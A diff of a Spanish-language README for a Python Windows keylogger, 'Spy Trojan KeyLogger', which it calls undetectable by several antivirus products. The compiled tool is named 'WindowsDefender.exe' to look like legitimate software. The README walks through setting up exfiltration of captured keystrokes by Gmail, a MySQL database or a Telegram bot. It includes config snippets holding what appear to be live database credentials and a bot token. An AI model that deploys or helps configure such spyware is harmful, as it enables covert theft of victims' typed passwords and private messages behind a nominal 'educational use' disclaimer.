@@ -1,13 +1,13 @@
 ````
 █▀ █▀█ █▄█   ▀█▀ █▀█ █▀█   █ ▄▀█ █▄ █   █▄▀ █▀▀ █▄█ █   █▀█ █▀▀ █▀▀ █▀▀ █▀█
-▄█ █▀▀  █     █  █▀▄ █▄█ █▄█ █▀█ █ ▀█   █ █ ██▄  █  █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v4.0.2     
+▄█ █▀▀  █     █  █▀▄ █▄█ █▄█ █▀█ █ ▀█   █ █ ██▄  █  █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v4.1.0     
 ````
 ---
 # ¡Por favor! úserla solo para fines educativos y con profesionalidad...
 ## Información
 * __Nombre:__ `Spy Trojan KeyLogger`
-* __Documentación:__ `25/05/2020`
-* __Versión:__ `4.0.2`
+* __Documentación:__ `28/05/2020`
+* __Versión:__ `4.1.0`
 * __Estado:__` Estable`
 * __Plataforma:__` Windows 7, 8.1 y 10`
 * __Lenguaje:__` Python 3.8`
@@ -26,12 +26,12 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 - `LICENCE` = Licencia 
 - `README.md`= Documentación
 - `version.txt` = Información detalla de conversión `.py` a `.exe`
-- `WindowsDefender.exe` = Keylogger Compilado `4.0.2`
+- `WindowsDefender.exe` = Keylogger Compilado `4.1.0`
 - `WindowsDefender.py` = Código fuente del Keylogger
 ---
 ---
 # Caracteristicas
-- __Indetectable Antivirus:__ Windows Defender `24/05/2020`, Avast, ESET NOD32
+- __Indetectable Antivirus:__ Windows Defender `26/05/2020`, Avast, ESET NOD32
 - __Envío por DB_MYSQL:__ Se enviarán los datos del registro mediante una base de datos MySQL, más información [Aquí](https://github.com/SebastianEPH/SpyTrojan_Keylogger#env%C3%ADo-mediante-base-de-datos-mysql)
 
     ![DataBase key](https://i.imgur.com/axhHVlF.png)
@@ -122,7 +122,7 @@ NOTA: Biblioteca no optimizada! :'(
 
 - Buscamos la siguiente función y escogemos [0 = Gmail], [1 = DataBase] o  [2 = BotTelegram]
     ````py
-    def GMailOrDataBase():
+    def SendMode():
         return 2    # 0 = Gmail
                     # 1 = DataBase              # Solo se puede usar una opción
                     # 2 = TelegramBot
@@ -135,30 +135,30 @@ NOTA: Biblioteca no optimizada! :'(
 
 3. Abra el archivo `WindowsDefender.py` en su editor de texto.
 4. Entre al codigo y busca la `ZONA CUSTOM BÁSICA` y modifique el `Correo primario` y el `Correo segundario`, luego rellene el o los `Correos que receptores`
-````py
-# ************ Zona Gmail ************* 
-def emailP():# Correo de envío [Primaria]                    
-    return "correo1@gmail.com"  # <<== Cambia éste correo
-def passP():                    # <<== Contraseña del correo
-    return "contra1"
-def emailS():# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
-    return "correo2@gmail.com"  # <<== Cambia éste correo
-def passS():                   
-    return "pass2"              # <<== Contraseña del correo 
+    ````py
+    # ************ Zona Gmail ************* 
+    def emailP():# Correo de envío [Primaria]                    
+        return "correo1@gmail.com"  # <<== Cambia éste correo
+    def passP():                    # <<== Contraseña del correo
+        return "contra1"
+    def emailS():# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
+        return "correo2@gmail.com"  # <<== Cambia éste correo
+    def passS():                   
+        return "pass2"              # <<== Contraseña del correo 
 
-def ReceiveE():#Correos que recibirán el registro de teclas.
-    #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
-    return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
-# ************ Fin Zona Gmail ************* 
+    def ReceiveE():#Correos que recibirán el registro de teclas.
+        #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
+        return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
+    # ************ Fin Zona Gmail ************* 
 
-def GMailOrDataBase():
-    return 0    # 1 = DataBase 
-                # 0 = Gmail
-                # (en las proximas actualizaciones , ambas a la vez)
+    def SendMode():
+        return 0    # 0 = Gmail
+                    # 1 = DataBase              # Solo se puede usar una opción
+                    # 2 = TelegramBot
 
-def timeSend(): # Tiempo de envío perzonalizado
-    return 120 #Minutos                 <= Escoja su tiempo en minutos
-````
+    def timeSend(): # Tiempo de envío perzonalizado
+        return 120 #Minutos                 <= Escoja su tiempo en minutos
+    ````
 
 ## [Configuración] Database MySQL
 
@@ -208,28 +208,28 @@ def timeSend(): # Tiempo de envío perzonalizado
 
 10. Ahora entramos a nuestro archivo `WindowsDefender.py` y buscamos y colocamos los datos de tu base de datos:
 
-````py
-# ************ Start Zone DATABASE ************* 
-def DB_HOST():
-    return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"   # Host
-def DB_USER():
-    return "udwlsyrbtldkznqo"                                       # Usuario de la base de datos
-def DB_PASS():
-    return "OR2i2dfdgWek0UDiAv4f"                                   # Contraseña de la Base de Datos
-def DB_NAME():
-    return "bh1g5gnxzw2igrvui8hq"                                   # Nombre de Base de datos
-def DB_PORT(): 
-    return "3306"                                                   # Opcional en algunos casos
+    ````py
+    # ************ Start Zone DATABASE ************* 
+    def DB_HOST():
+        return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"   # Host
+    def DB_USER():
+        return "udwlsyrbtldkznqo"                                       # Usuario de la base de datos
+    def DB_PASS():
+        return "OR2i2dfdgWek0UDiAv4f"                                   # Contraseña de la Base de Datos
+    def DB_NAME():
+        return "bh1g5gnxzw2igrvui8hq"                                   # Nombre de Base de datos
+    def DB_PORT(): 
+        return "3306"                                                   # Opcional en algunos casos
 
-# ************ Fin Zone DATABASE ************* 
-def GMailOrDataBase():
-    return 1    # 1 = DataBase 
-                # 0 = Gmail
-                # (en las proximas actualizaciones , ambas a la vez)
+    # ************ Fin Zone DATABASE ************* 
+    def SendMode():
+        return 1    # 0 = Gmail
+                    # 1 = DataBase              # Solo se puede usar una opción
+                    # 2 = TelegramBot
 
-def timeSend(): # Tiempo de envío perzonalizado
-    return 10 #Minutos                 <= Escoja su tiempo en minutos
-````
+    def timeSend(): # Tiempo de envío perzonalizado
+        return 10 #Minutos                 <= Escoja su tiempo en minutos
+    ````
 
 11. Si al ejecutar el keylogger todo salió bien, podemos ver en la base de datos el registro de teclas
 
@@ -240,12 +240,12 @@ def timeSend(): # Tiempo de envío perzonalizado
 # [Configuración] BotTelegram
 
 1. Entramos a [BotFather](https://telegram.me/BotFather) y creamos un nuevo bot.
-
-  ![botFather](https://i.imgur.com/1dtdBO6.png)
+    
+    ![botFather](https://i.imgur.com/1dtdBO6.png)
 
 2. Obtenemos nuetro token 
-
-  ![](https://i.imgur.com/oRYutuu.png)
+    
+    ![](https://i.imgur.com/oRYutuu.png)
 
 3. Ahora obtenemos nuestro `Chat ID`, esto se realiza para que solo el registro de teclas nos llegue a nosotros y no a cualquiera que encuentre el bot.
 
@@ -263,14 +263,13 @@ def timeSend(): # Tiempo de envío perzonalizado
                 
     # ************ Zone Telegram *************     
     def ID():
-        return 831756903            # <=  ID de chat telegram [Nota] no lo coloque entre comillas
+        return 123456789            # <=  ID de chat telegram [Nota] no lo coloque entre comillas
 
     def Token():
         return "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"    # Token del Bot del Telegram
 
     # ************ Zona Telegram ************* 
     ````
-
 
 
 # [Si usted desea modificar el keylogger lea la siguiente documentación aquí.](Doc/CustomKey.md)
